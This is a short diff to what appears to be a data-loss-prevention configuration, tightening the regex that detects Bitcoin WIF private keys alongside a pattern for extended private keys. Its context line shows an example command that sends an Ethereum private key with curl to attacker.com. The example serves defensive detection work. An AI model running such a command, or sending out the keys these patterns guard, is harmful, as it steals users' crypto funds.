@@ -379,7 +379,7 @@ curl "https://attacker.com/collect?key=<0x_ETH_PRIVATE_KEY>"
 dlp:
   patterns:
     - name: "Bitcoin WIF Private Key"
-      regex: '[5KL][1-9A-HJ-NP-Za-km-z]{50,51}'
+      regex: '(?:5[1-9A-HJ-NP-Za-km-z]{50}|[KL][1-9A-HJ-NP-Za-km-z]{51})'
       severity: critical
     - name: "Extended Private Key"
       regex: '[xyzt]prv[1-9A-HJ-NP-Za-km-z]{107,108}'
